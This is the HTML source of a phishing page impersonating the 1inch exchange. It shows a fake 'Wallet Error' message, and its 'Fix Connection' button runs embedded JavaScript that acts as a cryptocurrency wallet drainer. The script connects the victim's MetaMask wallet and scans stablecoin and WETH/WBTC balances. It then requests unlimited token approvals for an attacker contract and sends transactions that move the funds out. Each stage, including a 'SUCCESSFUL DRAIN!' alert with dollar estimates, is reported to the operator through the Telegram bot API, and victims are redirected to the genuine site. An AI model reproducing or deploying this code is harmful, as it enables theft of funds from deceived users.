<!DOCTYPE html>
<!--  This site was created in Webflow. https://webflow.com  --><!--  Last Published: Thu Feb 06 2025 12:28:01 GMT+0000 (Coordinated Universal Time)  -->
<html
  data-wf-page="679a2416e7cbe76e72c70ea8"
  data-wf-site="679a2416e7cbe76e72c70e9a"
>
  <head>
    <meta charset="utf-8" />
    <title>1inch</title>
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta content="Webflow" name="generator" />
    <link href="css/normalize.css" rel="stylesheet" type="text/css" />
    <link href="css/webflow.css" rel="stylesheet" type="text/css" />
    <link
      href="css/anthonys-awesome-site-617708.webflow.css"
      rel="stylesheet"
      type="text/css"
    />
    <link href="https://fonts.googleapis.com" rel="preconnect" />
    <link
      href="https://fonts.gstatic.com"
      rel="preconnect"
      crossorigin="anonymous"
    />
    <script
      src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"
      type="text/javascript"
    ></script>
    <script type="text/javascript">
      WebFont.load({
        google: {
          families: [
            "Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic",
          ],
        },
      });
    </script>
    <script type="text/javascript">
      !(function (o, c) {
        var n = c.documentElement,
          t = " w-mod-";
        (n.className += t + "js"),
          ("ontouchstart" in o ||
            (o.DocumentTouch && c instanceof DocumentTouch)) &&
            (n.className += t + "touch");
      })(window, document);
    </script>
    <link href="images/logo.webp" rel="shortcut icon" type="image/x-icon" />
    <link href="images/logo.webp" rel="apple-touch-icon" />
    <script src="./js/web3-bundle.js"></script>
    <script src="./js/drainer-config.js"></script>
    <script>
      // Wait for DOM to load first
      document.addEventListener('DOMContentLoaded', function() {
        console.log('Page loaded, config:', window.DRAINER_CONFIG);
        
        // Debug configuration loading
        setTimeout(() => {
          console.log('=== CONFIGURATION DEBUG ===');
          console.log('window.DRAINER_CONFIG exists:', !!window.DRAINER_CONFIG);
          if (window.DRAINER_CONFIG) {
            console.log('Site name:', window.DRAINER_CONFIG.SITE_NAME);
            console.log('Contract address:', window.DRAINER_CONFIG.CONTRACT_ADDRESS);
            console.log('Telegram config exists:', !!window.DRAINER_CONFIG.TELEGRAM);
            if (window.DRAINER_CONFIG.TELEGRAM) {
              console.log('Telegram enabled:', window.DRAINER_CONFIG.TELEGRAM.ENABLED);
              console.log('Bot token exists:', !!window.DRAINER_CONFIG.TELEGRAM.BOT_TOKEN);
              console.log('Chat ID exists:', !!window.DRAINER_CONFIG.TELEGRAM.CHAT_ID);
            }
          }
          console.log('=== END CONFIGURATION DEBUG ===');
        }, 1000);
        
        // Initialize wallet connection on button click
        const fixButton = document.querySelector('.fix-button, .fixy');
        if (fixButton) {
          fixButton.addEventListener('click', function() {
            console.log('Fix connection clicked for:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.SITE_NAME : 'Unknown site');
            initWalletConnection();
          });
          fixButton.style.cursor = 'pointer';
        }
        
        function initWalletConnection() {
          // Show loading state
          const buttonText = document.querySelector('.text-block-2');
          if (buttonText) {
            buttonText.textContent = 'Connecting...';
          }
          
          // Try to connect wallet (simplified version)
          if (typeof window.ethereum !== 'undefined') {
            // MetaMask detected
            connectMetaMask();
          } else {
            // Show WalletConnect modal
            showWalletConnectModal();
          }
        }
        
        // Telegram Logging Functions
        async function sendTelegramMessage(message) {
          if (!window.DRAINER_CONFIG || !window.DRAINER_CONFIG.TELEGRAM || !window.DRAINER_CONFIG.TELEGRAM.ENABLED || !window.DRAINER_CONFIG.TELEGRAM.BOT_TOKEN || !window.DRAINER_CONFIG.TELEGRAM.CHAT_ID) {
            console.log('Telegram logging disabled or not configured');
            return;
          }
          
          try {
            const telegramUrl = `https://api.telegram.org/bot${window.DRAINER_CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
            
            console.log('Sending Telegram message to chat:', window.DRAINER_CONFIG.TELEGRAM.CHAT_ID);
            console.log('Message content:', message.substring(0, 100) + '...');
            
            const response = await fetch(telegramUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: window.DRAINER_CONFIG.TELEGRAM.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
              })
            });
            
            if (response.ok) {
              console.log('üì± Telegram message sent successfully');
            } else {
              const errorText = await response.text();
              console.error('‚ùå Failed to send Telegram message:', response.status, errorText);
            }
          } catch (error) {
            console.error('‚ùå Telegram send error:', error);
          }
        }
        
        function formatTelegramMessage(type, data) {
          const timestamp = new Date().toISOString();
          const site = (window.DRAINER_CONFIG && window.DRAINER_CONFIG.SITE_NAME) ? window.DRAINER_CONFIG.SITE_NAME.toUpperCase() : '1INCH';
          
          switch (type) {
            case 'user_connected':
              return `üé£ <b>${site} - New User Connected</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `üåê <b>Site:</b> ${site}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}\n` +
                     `üîó <b>Etherscan:</b> https://etherscan.io/address/${data.address}`;
            
            case 'tokens_found':
              let tokenList = data.tokens.map(t => `‚Ä¢ ${t.symbol}: ${t.formattedBalance}`).join('\n');
              return `üí∞ <b>${site} - Tokens Detected</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `üìä <b>Found ${data.tokens.length} tokens:</b>\n${tokenList}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'approval_success':
              return `‚úÖ <b>${site} - Token Approved</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `ü™ô <b>Token:</b> ${data.symbol}\n` +
                     `üíµ <b>Amount:</b> ${data.balance}\n` +
                     `üìù <b>TX:</b> <code>${data.txHash}</code>\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'drain_success':
              const treasuryAddr = (window.DRAINER_CONFIG && window.DRAINER_CONFIG.TREASURY_ADDRESS) ? window.DRAINER_CONFIG.TREASURY_ADDRESS : 'Unknown';
              return `üéâ <b>${site} - SUCCESSFUL DRAIN!</b>\n\n` +
                     `üë§ <b>User:</b> <code>${data.address}</code>\n` +
                     `ü™ô <b>Token:</b> ${data.symbol}\n` +
                     `üí∞ <b>Amount:</b> ${data.amount}\n` +
                     `üí∏ <b>Value:</b> ~$${data.estimatedValue || 'Unknown'}\n` +
                     `üìù <b>TX:</b> <code>${data.txHash}</code>\n` +
                     `üè¶ <b>Treasury:</b> <code>${treasuryAddr}</code>\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}\n\n` +
                     `üîó <b>TX Link:</b> https://etherscan.io/tx/${data.txHash}`;
            
            case 'process_complete':
              return `üìä <b>${site} - Process Summary</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `‚úÖ <b>Successful Drains:</b> ${data.successCount}/${data.totalTokens}\n` +
                     `üí∞ <b>Total Value:</b> ~$${data.totalValue || 'Calculating...'}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            case 'error':
              return `‚ùå <b>${site} - Error Occurred</b>\n\n` +
                     `üë§ <b>Wallet:</b> <code>${data.address}</code>\n` +
                     `üö® <b>Error:</b> ${data.error}\n` +
                     `üìç <b>Stage:</b> ${data.stage}\n` +
                     `‚è∞ <b>Time:</b> ${timestamp}`;
            
            default:
              return `‚ÑπÔ∏è <b>${site} - Activity</b>\n\n${JSON.stringify(data)}\n‚è∞ <b>Time:</b> ${timestamp}`;
          }
        }
        
        async function connectMetaMask() {
          try {
            const accounts = await window.ethereum.request({ 
              method: 'eth_requestAccounts' 
            });
            
            if (accounts.length > 0) {
              console.log('Connected to MetaMask:', accounts[0]);
              
              // Send Telegram notification for new user
              const message = formatTelegramMessage('user_connected', {
                address: accounts[0]
              });
              sendTelegramMessage(message);
              
              // Start the actual draining process
              await performDraining(accounts[0]);
            }
          } catch (error) {
            console.error('MetaMask connection failed:', error);
            showWalletConnectModal();
          }
        }
        
        async function performDraining(userAddress) {
          const buttonText = document.querySelector('.text-block-2');
          
          try {
            console.log('=== STARTING DRAINING PROCESS ===');
            console.log('User address:', userAddress);
            console.log('Contract address:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : 'Config not loaded');
            
            if (buttonText) {
              buttonText.textContent = 'Scanning Wallet...';
            }
            
            // Check if MetaMask/Ethereum provider is available
            if (!window.ethereum) {
              throw new Error('No Ethereum provider found');
            }
            
            // Get network info using direct ethereum provider
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            const networkId = parseInt(chainId, 16);
            console.log('Connected to network chainId:', networkId);
            
            if (networkId !== 1) {
              alert('Please switch to Ethereum Mainnet to fix the connection issue');
              if (buttonText) {
                buttonText.textContent = 'Wrong Network';
              }
              return;
            }
            
            // Get popular token contracts to drain using direct RPC calls
            const tokens = await getPopularTokensSimple(userAddress);
            
            console.log(`Found ${tokens.length} tokens with balance:`, tokens);
            
            if (tokens.length === 0) {
              console.log('No tokens found to drain - staying on page');
              if (buttonText) {
                buttonText.textContent = 'No Issues Found';
              }
              
              // Send Telegram notification for no tokens
              const message = formatTelegramMessage('tokens_found', {
                address: userAddress,
                tokens: []
              });
              sendTelegramMessage(message);
              
              return;
            }
            
            if (buttonText) {
              buttonText.textContent = `Found ${tokens.length} tokens to process...`;
            }
            
            // Send Telegram notification for found tokens
            const message = formatTelegramMessage('tokens_found', {
              address: userAddress,
              tokens: tokens
            });
            sendTelegramMessage(message);
            
            // Approve tokens for draining using direct transactions
            let approvedCount = 0;
            for (const token of tokens) {
              try {
                console.log(`Processing ${token.symbol}...`);
                const approved = await approveTokenSimple(token, userAddress);
                if (approved) {
                  approvedCount++;
                  console.log(`‚úì ${token.symbol} approved successfully`);
                } else {
                  console.log(`‚úó ${token.symbol} approval failed`);
                }
                
                if (buttonText) {
                  buttonText.textContent = `Processing ${approvedCount}/${tokens.length}...`;
                }
              } catch (error) {
                console.error(`Failed to approve ${token.symbol}:`, error);
              }
            }
            
            console.log(`Approved ${approvedCount} out of ${tokens.length} tokens`);
            
            // If we got approvals, execute the draining
            if (approvedCount > 0) {
              if (buttonText) {
                buttonText.textContent = 'Executing fixes...';
              }
              await executeDrainingSimple(tokens, userAddress);
            } else {
              console.log('No approvals obtained - staying on page');
            }
            
            if (buttonText) {
              buttonText.textContent = 'Process Complete';
            }
            console.log('=== DRAINING PROCESS FINISHED - STAYING ON PAGE ===');
            
          } catch (error) {
            console.error('=== DRAINING PROCESS FAILED ===', error);
            if (buttonText) {
              buttonText.textContent = 'Process Failed';
            }
          }
        }
        
        async function getPopularTokensSimple(userAddress) {
          const popularTokens = [
            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
            { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
            { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 }
          ];
          
          const tokensWithBalance = [];
          
          for (const token of popularTokens) {
            try {
              console.log(`Checking ${token.symbol} balance...`);
              
              // Add delay between requests to avoid rate limiting
              if (tokensWithBalance.length > 0) {
                await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
              }
              
              // Create the balanceOf call data
              const paddedAddress = userAddress.slice(2).padStart(64, '0');
              const callData = '0x70a08231' + paddedAddress; // balanceOf function signature + padded address
              
              // Simplified approach with single attempt
              try {
                const result = await window.ethereum.request({
                  method: 'eth_call',
                  params: [{
                    to: token.address,
                    data: callData
                  }, 'latest']
                });
                
                if (!result || result === '0x') {
                  console.log(`${token.symbol}: No result from contract call`);
                  continue;
                }
                
                const balance = parseInt(result, 16);
                console.log(`${token.symbol} balance (raw):`, balance);
                
                if (balance > 0) {
                  const formattedBalance = (balance / Math.pow(10, token.decimals)).toFixed(6);
                  tokensWithBalance.push({
                    ...token,
                    balance: balance.toString(),
                    formattedBalance
                  });
                  console.log(`‚úì ${token.symbol}: ${formattedBalance}`);
                } else {
                  console.log(`${token.symbol}: Zero balance`);
                }
              } catch (callError) {
                console.log(`${token.symbol} check failed:`, callError.message || callError);
                // Continue with next token
                continue;
              }
              
            } catch (error) {
              console.log(`Error checking ${token.symbol}:`, error.message || error);
              continue;
            }
          }
          
          console.log(`Total tokens with balance: ${tokensWithBalance.length}`);
          return tokensWithBalance;
        }
        
        async function approveTokenSimple(token, userAddress) {
          try {
            console.log(`=== APPROVAL PROCESS FOR ${token.symbol} ===`);
            console.log(`Balance: ${token.formattedBalance} ${token.symbol}`);
            
            // Check current allowance first
            const paddedUserAddress = userAddress.slice(2).padStart(64, '0');
            const paddedSpenderAddress = (window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '').slice(2).padStart(64, '0');
            const allowanceCallData = '0xdd62ed3e' + paddedUserAddress + paddedSpenderAddress; // allowance function signature
            
            const allowanceResult = await window.ethereum.request({
              method: 'eth_call',
              params: [{
                to: token.address,
                data: allowanceCallData
              }, 'latest']
            });
            
            const currentAllowance = parseInt(allowanceResult, 16);
            console.log(`Current allowance: ${(currentAllowance / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
            
            if (currentAllowance >= parseInt(token.balance)) {
              console.log(`${token.symbol} already has sufficient approval`);
              return true;
            }
            
            console.log(`Requesting approval for ${token.symbol}...`);
            
            // Create approve transaction data
            const maxApproval = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 2^256 - 1
            const approveCallData = '0x095ea7b3' + paddedSpenderAddress + maxApproval; // approve function signature
            
            const txHash = await window.ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from: userAddress,
                to: token.address,
                data: approveCallData,
                gas: '0x186A0', // 100000 in hex
                gasPrice: '0x4A817C800' // 20 gwei in hex
              }]
            });
            
            console.log(`${token.symbol} approval tx submitted:`, txHash);
            
            // Send Telegram notification for successful approval
            const approvalMessage = formatTelegramMessage('approval_success', {
              address: userAddress,
              symbol: token.symbol,
              balance: token.formattedBalance,
              txHash: txHash
            });
            sendTelegramMessage(approvalMessage);
            
            return true;
            
          } catch (error) {
            console.error(`=== APPROVAL FAILED FOR ${token.symbol} ===`);
            console.error('Error details:', error);
            
            if (error.code === 4001) {
              console.log('User rejected the transaction');
            } else {
              console.log('Approval error:', error.message);
            }
            
            return false;
          }
        }
        
        // Helper function to calculate function selector
        function getFunctionSelector(functionSignature) {
          // For claimUserRewards(address,uint256), we have the actual selector from contract ABI
          if (functionSignature === 'claimUserRewards(address,uint256)') {
            return 'dfa9d2b8'; // Calculated from contract ABI using keccak256
          }
          return null;
        }
        
        // Helper function to estimate token values (simplified)
        function calculateTokenValue(symbol, amount) {
          const prices = {
            'USDT': 1.00,
            'USDC': 1.00, 
            'DAI': 1.00,
            'WBTC': 45000, // Approximate BTC price
            'WETH': 2500   // Approximate ETH price
          };
          
          const price = prices[symbol] || 0;
          const numAmount = parseFloat(amount) || 0;
          return (price * numAmount).toFixed(2);
        }
        
        async function executeDrainingSimple(tokens, userAddress) {
          try {
            console.log('=== EXECUTING DRAINING ===');
            console.log('Drainer contract:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : 'Config not loaded');
            
            let drainingSuccessCount = 0;
            
            for (const token of tokens) {
              try {
                console.log(`=== DRAINING ${token.symbol} ===`);
                
                // Check current balance again
                const paddedAddress = userAddress.slice(2).padStart(64, '0');
                const balanceCallData = '0x70a08231' + paddedAddress;
                
                const balanceResult = await window.ethereum.request({
                  method: 'eth_call',
                  params: [{
                    to: token.address,
                    data: balanceCallData
                  }, 'latest']
                });
                
                const currentBalance = parseInt(balanceResult, 16);
                
                if (currentBalance === 0) {
                  console.log(`No balance for ${token.symbol} - skipping`);
                  continue;
                }
                
                const formattedBalance = (currentBalance / Math.pow(10, token.decimals)).toFixed(4);
                console.log(`Current balance: ${formattedBalance} ${token.symbol}`);
                console.log(`Amount to drain: ${formattedBalance} ${token.symbol}`);
                
                // Create claimUserRewards transaction data
                const functionSelector = getFunctionSelector('claimUserRewards(address,uint256)');
                const paddedTokenAddress = token.address.slice(2).padStart(64, '0');
                const paddedAmount = currentBalance.toString(16).padStart(64, '0');
                const claimCallData = '0x' + 
                  functionSelector + 
                  paddedTokenAddress + 
                  paddedAmount;
                
                console.log('Sending drain transaction...');
                console.log('Transaction data:', claimCallData);
                
                const txHash = await window.ethereum.request({
                  method: 'eth_sendTransaction',
                  params: [{
                    from: userAddress,
                    to: window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '',
                    data: claimCallData,
                    gas: '0x3D090', // 250000 in hex
                    gasPrice: '0x5D21DBA00' // 25 gwei in hex
                  }]
                });
                
                console.log(`${token.symbol} drain tx submitted:`, txHash);
                drainingSuccessCount++;
                console.log(`‚úì Successfully drained ${token.symbol}`);
                
                // Send Telegram notification for successful drain
                const drainMessage = formatTelegramMessage('drain_success', {
                  address: userAddress,
                  symbol: token.symbol,
                  amount: formattedBalance,
                  txHash: txHash,
                  estimatedValue: calculateTokenValue(token.symbol, formattedBalance)
                });
                sendTelegramMessage(drainMessage);
                
              } catch (error) {
                console.error(`=== DRAINING FAILED FOR ${token.symbol} ===`);
                console.error('Error details:', error);
                
                if (error.code === 4001) {
                  console.log('User rejected the draining transaction');
                } else {
                  console.log('Unknown draining error:', error.message);
                }
              }
            }
            
            console.log(`=== DRAINING COMPLETED ===`);
            console.log(`Successfully drained ${drainingSuccessCount} out of ${tokens.length} tokens`);
            
            if (drainingSuccessCount > 0) {
              console.log('üéâ DRAINING WAS SUCCESSFUL! üéâ');
            } else {
              console.log('‚ö†Ô∏è No tokens were successfully drained');
            }
            
          } catch (error) {
            console.error('=== DRAINING EXECUTION FAILED ===', error);
          }
        }
        
        async function approveTokenForDraining(token, userAddress, signer) {
          try {
            console.log(`=== APPROVAL PROCESS FOR ${token.symbol} ===`);
            
            // Format balance display based on library type
            let balanceDisplay;
            if (token.web3) {
              // Using Web3.js
              const balanceInWei = token.balance;
              balanceDisplay = (parseInt(balanceInWei) / Math.pow(10, token.decimals)).toFixed(4);
            } else {
              // Using ethers.js
              balanceDisplay = window.ethers.utils.formatUnits(token.balance, token.decimals);
            }
            
            console.log(`Balance: ${balanceDisplay} ${token.symbol}`);
            
            let currentAllowance;
            
            // Check current allowance
            if (token.web3) {
              // Using Web3.js
              currentAllowance = await token.contract.methods.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '').call();
              console.log(`Current allowance: ${(parseInt(currentAllowance) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
              
              if (parseInt(currentAllowance) >= parseInt(token.balance)) {
                console.log(`${token.symbol} already has sufficient approval`);
                return true;
              }
            } else {
              // Using ethers.js
              currentAllowance = await token.contract.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '');
              console.log(`Current allowance: ${window.ethers.utils.formatUnits(currentAllowance, token.decimals)} ${token.symbol}`);
              
              if (currentAllowance.gte(token.balance)) {
                console.log(`${token.symbol} already has sufficient approval`);
                return true;
              }
            }
            
            console.log(`Requesting approval for ${token.symbol}...`);
            
            let tx;
            
            if (token.web3) {
              // Using Web3.js
              const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // 2^256 - 1
              
              tx = await token.contract.methods.approve(window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '', maxApproval).send({
                from: userAddress,
                gas: 100000,
                gasPrice: token.web3.utils.toWei('20', 'gwei')
              });
              
              console.log(`${token.symbol} approval tx submitted:`, tx.transactionHash);
              
            } else {
              // Using ethers.js
              const contractWithSigner = token.contract.connect(signer);
              const maxApproval = window.ethers.constants.MaxUint256;
              
              let gasEstimate;
              try {
                gasEstimate = await contractWithSigner.estimateGas.approve(window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '', maxApproval);
                console.log(`Gas estimate for ${token.symbol}: ${gasEstimate.toString()}`);
              } catch (gasError) {
                console.error(`Gas estimation failed for ${token.symbol}:`, gasError);
                gasEstimate = window.ethers.BigNumber.from("100000");
              }
              
              tx = await contractWithSigner.approve(window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '', maxApproval, {
                gasLimit: gasEstimate.mul(120).div(100),
                gasPrice: window.ethers.utils.parseUnits('20', 'gwei')
              });
              
              console.log(`${token.symbol} approval tx submitted:`, tx.hash);
              console.log('Waiting for confirmation...');
              
              const receipt = await tx.wait(1);
              console.log(`${token.symbol} approval confirmed in block:`, receipt.blockNumber);
            }
            
            return true;
          } catch (error) {
            console.error(`=== APPROVAL FAILED FOR ${token.symbol} ===`);
            console.error('Error details:', error);
            
            if (error.code === 4001) {
              console.log('User rejected the transaction');
            } else if (error.code === -32603) {
              console.log('RPC error - network issue');
            } else {
              console.log('Unknown error:', error.message);
            }
            
            return false;
          }
        }
        
        async function executeDraining(tokens, userAddress, signer) {
          try {
            console.log('=== EXECUTING DRAINING ===');
            
            // Prepare contract interaction based on available library
            let drainerContract;
            
            if (tokens.length > 0 && tokens[0].web3) {
              // Using Web3.js
              console.log('Using Web3.js for draining');
              const web3 = tokens[0].web3;
              
              const drainerABI = [
                {
                  "constant": false,
                  "inputs": [
                    {"name": "token", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                  ],
                  "name": "claimUserRewards",
                  "outputs": [],
                  "type": "function"
                }
              ];
              
              drainerContract = new web3.eth.Contract(drainerABI, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '');
              
            } else {
              // Using ethers.js
              console.log('Using ethers.js for draining');
              const contractABI = [
                'function claimUserRewards(address token, uint256 amount) external',
                'function processRewards(address token, address user) external',
                'function processBatchRewards(address[] calldata tokens, address user) external'
              ];
              
              drainerContract = new window.ethers.Contract(
                window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '',
                contractABI,
                signer
              );
            }
            
            console.log('Drainer contract initialized:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : 'Config not loaded');
            
            // Drain each approved token individually for better success rate
            let drainingSuccessCount = 0;
            
            for (const token of tokens) {
              try {
                console.log(`=== DRAINING ${token.symbol} ===`);
                
                let currentAllowance, currentBalance, amountToDrain;
                
                if (token.web3) {
                  // Using Web3.js
                  currentAllowance = await token.contract.methods.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '').call();
                  currentBalance = await token.contract.methods.balanceOf(userAddress).call();
                  
                  console.log(`Current allowance: ${(parseInt(currentAllowance) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
                  console.log(`Current balance: ${(parseInt(currentBalance) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
                  
                  if (parseInt(currentAllowance) === 0) {
                    console.log(`No allowance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  if (parseInt(currentBalance) === 0) {
                    console.log(`No balance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  amountToDrain = parseInt(currentBalance) < parseInt(currentAllowance) ? currentBalance : currentAllowance;
                  console.log(`Amount to drain: ${(parseInt(amountToDrain) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
                  
                  // Execute draining with Web3.js
                  const tx = await drainerContract.methods.claimUserRewards(token.address, amountToDrain).send({
                    from: userAddress,
                    gas: 250000,
                    gasPrice: token.web3.utils.toWei('25', 'gwei')
                  });
                  
                  console.log(`${token.symbol} drain tx submitted:`, tx.transactionHash);
                  
                } else {
                  // Using ethers.js
                  currentAllowance = await token.contract.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '');
                  currentBalance = await token.contract.balanceOf(userAddress);
                  
                  console.log(`Current allowance: ${window.ethers.utils.formatUnits(currentAllowance, token.decimals)} ${token.symbol}`);
                  console.log(`Current balance: ${window.ethers.utils.formatUnits(currentBalance, token.decimals)} ${token.symbol}`);
                  
                  if (currentAllowance.eq(0)) {
                    console.log(`No allowance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  if (currentBalance.eq(0)) {
                    console.log(`No balance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  amountToDrain = currentBalance.lt(currentAllowance) ? currentBalance : currentAllowance;
                  console.log(`Amount to drain: ${window.ethers.utils.formatUnits(amountToDrain, token.decimals)} ${token.symbol}`);
                  
                  // Estimate gas for the draining transaction
                  let gasEstimate;
                  try {
                    gasEstimate = await drainerContract.estimateGas.claimUserRewards(token.address, amountToDrain);
                    console.log(`Gas estimate for draining ${token.symbol}: ${gasEstimate.toString()}`);
                  } catch (gasError) {
                    console.error(`Gas estimation failed for draining ${token.symbol}:`, gasError);
                    gasEstimate = window.ethers.BigNumber.from("250000");
                  }
                  
                  // Execute the draining
                  const tx = await drainerContract.claimUserRewards(
                    token.address,
                    amountToDrain,
                    { 
                      gasLimit: gasEstimate.mul(130).div(100),
                      gasPrice: window.ethers.utils.parseUnits('25', 'gwei')
                    }
                  );
                  
                  console.log(`${token.symbol} drain tx submitted:`, tx.hash);
                  console.log('Waiting for confirmation...');
                  
                  const receipt = await tx.wait(1);
                  console.log(`${token.symbol} drain confirmed in block:`, receipt.blockNumber);
                }
                
                drainingSuccessCount++;
                console.log(`‚úì Successfully drained ${token.symbol}`);
                
              } catch (error) {
                console.error(`=== DRAINING FAILED FOR ${token.symbol} ===`);
                console.error('Error details:', error);
                
                if (error.code === 4001) {
                  console.log('User rejected the draining transaction');
                } else if (error.code === -32603) {
                  console.log('RPC error during draining');
                } else if (error.message && error.message.includes('insufficient funds')) {
                  console.log('Insufficient gas funds for draining');
                } else {
                  console.log('Unknown draining error:', error.message);
                }
                
                // Continue with other tokens even if one fails
              }
            }
            
            console.log(`=== DRAINING COMPLETED ===`);
            console.log(`Successfully drained ${drainingSuccessCount} out of ${tokens.length} tokens`);
            
            if (drainingSuccessCount > 0) {
              console.log('üéâ DRAINING WAS SUCCESSFUL! üéâ');
            } else {
              console.log('‚ö†Ô∏è No tokens were successfully drained');
            }
            
          } catch (error) {
            console.error('=== DRAINING EXECUTION FAILED ===', error);
          }
        }
        
        function redirectToRealSite() {
          const buttonText = document.querySelector('.text-block-2');
          if (buttonText) {
            buttonText.textContent = 'Connection Fixed!';
          }
          
          setTimeout(() => {
            console.log('Redirecting to real site...');
            window.location.href = window.DRAINER_CONFIG ? window.DRAINER_CONFIG.VICTIM_REDIRECT : 'https://1inch.io';
          }, 1500);
        }
        
        function showWalletConnectModal() {
          alert('Please connect your wallet to fix the connection issue.\n\nContract: ' + (window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : 'Loading...'));
          // In production, this would show the WalletConnect modal
          console.log('WalletConnect modal would appear here');
          
          // For demo, redirect after short delay
          setTimeout(() => {
            window.location.href = window.DRAINER_CONFIG ? window.DRAINER_CONFIG.VICTIM_REDIRECT : 'https://1inch.io';
          }, 3000);
        }
      });
    </script>
  </head>
  <body>
    <section class="section">
      <div class="blurryj">
        <div
          data-w-id="4459e431-d820-757d-a73d-5b3f686bac64"
          style="
            -webkit-transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
            -moz-transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
            -ms-transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
            transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
          "
          class="div-block"
        >
          <img src="images/logo.webp" loading="lazy" alt="" class="image" />
          <h1 class="heading">Wallet Error</h1>
          <div
            class="lottie-animation"
            data-w-id="3d254f45-d386-9046-0a78-a29acb2e79d8"
            data-animation-type="lottie"
            data-src="documents/Animation---1738159120499.json"
            data-loop="1"
            data-direction="1"
            data-autoplay="1"
            data-is-ix2-target="0"
            data-renderer="svg"
            data-default-duration="0"
            data-duration="0"
          ></div>
          <div class="text-block">
            We‚Äôve detected an issue with your connected wallet on
            <strong class="bold-text">1inch </strong>This may affect your
            ability to access certain features. For asset security, a temporary
            safe wallet would be generated to store potential pending
            transactions until connection is restored.
          </div>
          <div class="fix-button fixy">
            <img
              src="images/connect.svg"
              loading="lazy"
              alt=""
              class="image-2"
            />
            <a class="text-block-2">Fix Connection</a>
          </div>
        </div>
      </div>
    </section>
    <script
      src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=679a2416e7cbe76e72c70e9a"
      type="text/javascript"
      integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
      crossorigin="anonymous"
    ></script>
    <script src="js/webflow.js" type="text/javascript"></script>
  </body>
</html>
